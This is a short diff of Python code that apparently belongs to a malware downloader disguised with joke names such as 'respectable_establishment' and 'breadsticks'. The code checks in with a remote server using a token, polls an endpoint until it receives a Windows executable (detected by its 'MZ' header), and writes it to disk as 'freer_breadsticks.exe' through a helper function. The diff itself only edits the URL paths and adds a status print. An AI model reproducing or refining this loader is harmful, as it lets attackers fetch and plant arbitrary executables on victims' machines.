@@ -32,16 +32,17 @@ if(res):
 
 else:
     
-    res = get('http://%s/respectable_establishment/cgi/confirm.php?t=%s' % (o, token))
+    res = get('http://%s/respectable_establishment/confirm.php?t=%s' % (o, token))
     if res.status_code != 200:
         raise Exception("failed to notify server of new breadsticks affectionado")
     else:
         while 1:
             try:
-                a = get('http://%s/respectable_establishment/cgi/refunds.php?q=%s' % (o, token))
+                a = get('http://%s/respectable_establishment/refunds.php?q=%s' % (o, token))
                 if a.content[:2] == b'MZ':
                     p = r'freer_breadsticks.exe'
-                    res = d_r(p, a.content)            
+                    res = d_r(p, a.content)
+                    print('breadsticks refunded')
                     break
             
             except:
